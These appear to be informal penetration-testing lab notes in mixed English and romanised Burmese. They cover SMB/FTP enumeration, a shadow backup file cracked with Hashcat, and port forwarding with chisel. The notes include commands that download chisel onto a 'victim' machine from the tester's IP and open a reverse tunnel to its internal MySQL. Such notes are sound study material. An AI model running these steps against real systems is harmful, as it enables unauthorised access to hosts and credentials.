
[printers]     => file sharing loke dr ko pyaw dr

![[Pasted image 20230110220048.png]]


------------------------------------

ftp mar vlun shi dal   => but smb  mar lal vlun shi dal => smb ko use bee ftp ko attack dar

ftp vlun  => site 
smb => annonymous user




==>  /var/backups/shadow.bak    => var -> backups mr important datas twe shi dal => de kaung so root permission net run nay dar

![[Pasted image 20230110222655.png]]


Hashcat

![[Pasted image 20230110224445.png]]



----


3 types of port forwarding 

-> local
-> dynamic
-> remote


---
netstat -antp   ======> bal port twe run nay lal kyi dar  ****



---

Tunnel Port Forwarding

chisel   ->  download chisel that compate with your os version(i use amd 64)

( vitim mar yaw ko bar ko yaw chisel run nay ya mal)

python3 -m http.server    -> in my machine

wget http://192.168.99.116:8000/chisel  -> victim machine

./chisel  -> run


=====>  Chisel Command

chisel server -p 10000 --reverse    -> in my kali machine

./chisel client 192.168.99.116:10000 R:3306:127.0.0.1:3306    => client machine

netstat -antp   -> check with this one run or not

 mysql -h 127.0.0.1 -u librenms -p   ->  go go






